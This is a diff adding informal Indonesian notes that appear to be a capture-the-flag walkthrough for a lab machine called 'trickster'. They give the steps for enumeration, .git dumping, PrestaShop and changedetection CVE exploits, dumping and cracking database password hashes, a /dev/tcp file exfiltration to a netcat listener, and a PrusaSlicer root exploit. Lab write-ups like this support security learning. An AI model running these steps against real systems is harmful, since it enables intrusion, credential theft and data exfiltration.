@@ -1,0 +1,30 @@
+1. scan nmap 22 80 doang kebuka ada host taruh aja
+2. fuzz subdo ada juga kasih ginian biar ga ada issue subdo fuzz nya ->  | grep -v "301"
+3. fuzz lagi itu subdo baru -> ada .git dump aja itu path .git
+4. masuk hasil dumper ada path ternyata -> admin634ewutrx1jgitlooaj -> masuk ke path itu aja
+5. jawab2 in aja cve nya yang dicari ini -> CVE-2024-34716 
+6. adam <adam@trickster.htb> -> dapet dari git log di dumper 
+7. cari aja ini exploitnya -> https://github.com/aelmokhtar/CVE-2024-34716
+8. masuk shell cari2 -> di app tuh -> parameters.php -> ada creds mysql
+9. mysql aja kesitu ->  select email,passwd from ps_employee; -> dapet creds
+10. langsung crack passwd nya -> john hash rockyou -> ssh atau su aja
+
+pe:
+1. ip a -> find / -name Dockerfile 2>/dev/null -> atau find -perm -u=s juga bisa
+2. dapet /opt kesana ada pres apa gitu ada binary nya -> run coba
+3. cari cve ini -> PrusaSlicer-2.6.1 -> di bin nya itu ada 
+4. pusing -> baca wu aja intinya disini ada service docker -> curl http://172.17.0.2:5000
+5. terus port forward -> ssh -L 5000:172.17.0.2:5000 james@trickster.htb 
+6. terus kesini -> http://localhost:5000/login login pake password james -> cve ini -> CVE-2024-32651
+7. run cve exploitnya -> python3 exp.py --url http://localhost:5000 --port 6969 --ip ip vpn
+8. cari aja dah yang ssti itu di github nya changedetection   -> chngdetect ssti 
+9. dapet shell root docker -> ls / -> ke datastore backup
+10. file zip di backup giniiin di mesinmu -> nc -nvlp 6969 > namafile.zip
+11. di mesin target -> cat namafile.zip > /dev/tcp/ipvpnmu/portnc
+12. dapet tuh zip di unzip isinya .txt.br -> brotli -d nama.txt.br
+13. dapet isinya creds db coba ssh kesana
+14. ini cve nya katanya -> CVE-2023-47268 -> ikut wu aja dah 
+15. exploitnya disini -> https://github.com/suce0155/prusaslicer_exploit/
+16. ada 2 file nanti yangg exploit.sh nyesuain
+17. harus di tmp exploit.sh nya -> sudo -u root /opt/PrusaSlicer/prusaslicer -s evil.3mf 
+18. sambil nc nanti jadi root -> klaim flag     
